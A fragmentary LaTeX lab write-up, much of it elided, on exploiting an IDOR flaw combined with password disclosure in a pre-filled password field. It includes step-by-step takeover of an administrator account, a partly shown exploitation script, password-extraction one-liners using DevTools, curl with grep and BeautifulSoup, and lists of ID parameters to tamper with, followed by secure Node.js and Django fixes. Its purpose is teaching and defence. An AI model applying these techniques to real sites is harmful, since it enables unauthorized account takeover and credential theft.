...
\midrule
Description & \inlinecode{/my-account?id=X} returns any user's data & Password pre-filled in masked input \\
...
The UI password mask (\inlinecode{type="password"}) only affects \emph{visual display}. If the HTML contains:

\begin{listing}[H]
\begin{minted}{html}
<input type="password" name="password" value="SuperSecret123!" />
\end{minted}
\caption{Password ``masked'' in UI but fully exposed in DOM}
\end{listing}
...
\begin{itemize}
  ...
  \item \textbf{JavaScript}: \inlinecode{document.querySelector('input[name=password]').value}
...
\end{minted}
\caption{Identifying user ID in URL parameter}
\end{listing}

\begin{notebox}[Discovery Indicators]
Look for these patterns in account/profile URLs:
\begin{itemize}
  \item \inlinecode{/my-account?id=username}
  \item \inlinecode{/profile?user=john}
  \item \inlinecode{/account?uid=12345}
  \item \inlinecode{/settings?userId=abc-123}
\end{itemize}
\end{notebox}
...
\end{minted}
\caption{Searching for password values in response}
\end{listing}
...
\begin{enumerate}
  ...
  \item Check if it has a \inlinecode{value} attribute with actual password
  \item Alternatively: Console $\rightarrow$ \inlinecode{document.querySelector('input[type=password]').value}
\end{enumerate}
...
/>
\end{minted}
\caption{What vulnerable password field looks like in Elements tab}
\end{listing}
...
\end{minted}
\caption{Testing IDOR by changing user ID}
\end{listing}
...
\end{minted}
\caption{Step 1: Login with provided credentials}
\end{listing}
...
\end{minted}
\caption{Step 2: Observe password disclosure on own account}
\end{listing}

\begin{tipbox}[Key Observation]
Notice the password input has \inlinecode{value="peter"} - your actual password is visible in the HTML source! This is vulnerability \#1: Password Disclosure.
\end{tipbox}
...
\end{minted}
\caption{Step 3: Change id parameter to administrator}
\end{listing}
...
\end{minted}
\caption{Step 5: Login as administrator}
\end{listing}
...
-- Lab solved! --
\end{minted}
\caption{Step 6: Access admin panel and delete user}
\end{listing}
...
if __name__ == "__main__":
    main()
\end{minted}
\caption{Full multi-phase exploitation script}
\end{listing}
...
\end{minted}
\caption{Simplified single-purpose script}
\end{listing}
...
\begin{enumerate}
  ...
  \begin{itemize}
    ...
    \item \inlinecode{GET /my-account?id=administrator} with wiener's cookie
    \item Response showing administrator's account data
  \end{itemize}

  \item \textbf{Password Disclosure Evidence}
  \begin{itemize}
    \item Screenshot/snippet of HTML showing password in \inlinecode{value} attribute
    \item Highlighted: \inlinecode{<input type="password" name="password" value="ACTUAL_PASSWORD">}
  \end{itemize}
...
\end{minted}
\caption{Node.js: Proper password storage and change flow}
\end{listing}
...
\end{minted}
\caption{Node.js: Derive user from session, not parameter}
\end{listing}
...
\end{minted}
\caption{Django: Secure account view}
\end{listing}
...
\end{minted}
\caption{Secure password change form template}
\end{listing}
...
\begin{itemize}[label=$\square$]
  ...
  \item Test: \inlinecode{document.querySelector('input[type=password]').value}
...
DevTools Console & \inlinecode{document.querySelector('input[name=password]').value} \\
curl + grep & \inlinecode{curl -s URL | grep -oP 'value="\textbackslash K[^"]+'} \\
Python/BeautifulSoup & \inlinecode{soup.find('input', \{'name': 'password'\})['value']} \\
\bottomrule
...
\midrule
\inlinecode{id} & \inlinecode{/my-account?id=administrator} \\
\inlinecode{user} & \inlinecode{/profile?user=admin} \\
\inlinecode{userId} & \inlinecode{/account?userId=12345} \\
\inlinecode{uid} & \inlinecode{/settings?uid=admin} \\
\inlinecode{username} & \inlinecode{/account?username=administrator} \\
\bottomrule
